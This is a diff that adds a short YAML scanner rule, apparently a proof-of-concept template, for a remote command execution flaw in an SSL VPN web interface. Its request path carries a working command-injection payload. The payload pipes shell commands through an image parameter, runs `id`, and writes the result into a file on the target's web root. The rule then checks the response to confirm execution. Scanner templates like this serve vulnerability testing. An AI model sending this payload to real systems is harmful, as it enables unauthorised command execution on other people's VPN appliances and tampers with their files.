@@ -1,0 +1,11 @@
+name: ssl-vpn-rce
+rules:
+  - method: GET
+    path: "/sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60id%60%20|tee%20/usr/local/webui/sslvpn/test.txt|ls"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"echo")
+detail:
+  author: lxy
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "SSL VPN 远程命令执行漏洞"
